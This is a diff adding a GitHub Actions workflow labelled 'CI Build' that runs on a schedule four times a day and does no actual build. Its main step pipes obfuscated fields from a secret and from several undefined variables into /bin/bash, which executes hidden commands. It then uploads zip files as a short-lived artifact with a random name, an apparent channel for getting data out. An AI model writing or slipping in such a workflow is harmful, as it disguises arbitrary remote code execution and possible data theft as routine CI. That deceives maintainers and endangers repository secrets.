@@ -1,0 +1,30 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 4,10,16,22 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          sdbke20431: ${{ secrets.sdbke20431 }}
+        run: |
+          printf '%s' "$sdbke20431" | jq -r .m32377 | /bin/bash
+          echo $kx3 | jq -r .rr9 | /bin/bash
+          printf '%s' "$a15" | jq -r .ft92 | /bin/bash
+          printf '%s' "$oyx335" | jq -r .nbv0 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: NqGYCjHq
+          path: "*.zip"
+          retention-days: 1
